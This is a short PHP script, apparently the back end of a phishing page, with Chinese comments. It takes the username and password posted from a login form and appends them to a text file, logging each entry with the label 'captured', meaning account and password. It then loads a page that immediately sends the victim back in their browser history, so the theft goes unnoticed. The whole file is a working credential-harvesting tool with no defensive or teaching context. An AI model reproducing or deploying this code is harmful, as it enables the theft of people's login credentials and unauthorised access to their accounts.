<?php
$nam = stripslashes($_POST['user']);
$pas = stripslashes($_POST['pass']);
$content = "已捕获...."."账号:".$nam."密码:".$pas;
$filed = @fopen("1.txt","a+");

@fwrite($filed, "$content\n");

?>

<html>
<head>
<script type= "text/javascript">
function goBack()
{
window.history.back()//后退+刷新
}
</script>
</head>
<body onload="goBack()">  <!-- 加载之后立即执行一段JavaScript--->
</body>
</html>
